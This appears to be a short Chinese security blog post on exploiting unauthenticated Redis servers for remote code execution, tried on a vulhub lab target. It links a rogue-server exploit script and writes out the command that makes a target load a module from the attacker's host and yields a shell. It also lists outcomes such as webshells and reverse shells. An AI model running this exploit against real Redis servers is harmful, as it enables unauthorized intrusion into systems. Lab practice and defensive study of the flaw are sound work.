#  Redis未授权访问利用RCE脚本   
原创 道玄安全  道玄网安驿站   2024-08-18 19:30  
  
**“**  
 redis-rce**”**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPA9bic9zzTydWv4XTTHH2NAiamMp8Kxsh4s2lukPuyuwnia3NiaHkiaU8a3JGFhLvNnYvtLvHTFAd91Rw/640?wx_fmt=png&from=appmsg "")  
  
      
看到了，**关注一下**  
不吃亏啊，点个赞转发一下啦，WP看不下去的，可以B站搜：**标松君**  
，UP主录的打靶视频，欢迎关注。顺便宣传一下星球：**重生者安全，**  
 里面每天会不定期更新**OSCP**  
知识点，**车联网**  
，**渗透红队**  
以及**漏洞挖掘工具**  
等信息分享，欢迎加入；以及想挖**SRC逻辑漏洞**  
的朋友，可以私聊。  
  
  
  
  
  
01  
  
—  
  
  
  
Redis-RCE  
  
  
      
  
    Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。  
  
    Redis在默认情况下，会绑定6379这个端口，如果服务器没有采用限制IP访问或在防火墙做策略，就会将Redis服务暴露在公网上，并且在没有设置密码认证的情况下（既然有密码也可进行爆破），会导致用户未授权访问，可能导致，SSH远程登录，写入webshell，交互式shell，反弹shell等操作  
  
    影响版本：  
Redis 2.x，3.x，4.x，5.x  
  
    小编这里找到一个改进过后的RCE脚本：  
```
https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server
```  
  
靶机(vulhub)启动redis后，直接上命令  
```
python3 redis_rogue_server.py  -rhost 192.168.x.x -lhost 192.168.x.x -v
输入i，获取shell
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yNicicwofickJZ0PGianTCsUk1ybZHibw3DO43CibZ2ibe8SCDNpdOEBjNln0Yy6qpEHVhHoB3TZlicyEJMAQ/640?wx_fmt=png&from=appmsg "")  
  
挺好使的脚本，下回遇到redis 4.x的版本，直接打。  
  
  
  
  
  
**更多精彩内容请扫码关注“重生者安全”星球**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/L369x9IF3yPA9bic9zzTydWv4XTTHH2NAeuqcZvqTz0LHiadOuGVcHz49J7Wl5mAkug4yC75PbuErvyuib90R9l8g/640?wx_fmt=png&from=appmsg "")  
  
****  
免责声明：  
### 本人所有文章均为技术分享，均用于防御为目的的记录，所有操作均在实验环境下进行，请勿用于其他用途，否则后果自负。  
  
第二十七条：任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序和工具；明知他人从事危害网络安全的活动，不得为其提供技术支持、广告推广、支付结算等帮助  
  
第十二条：  国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。  
  
任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。  
  
第十三条：  国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。  
  
  
  
  
  
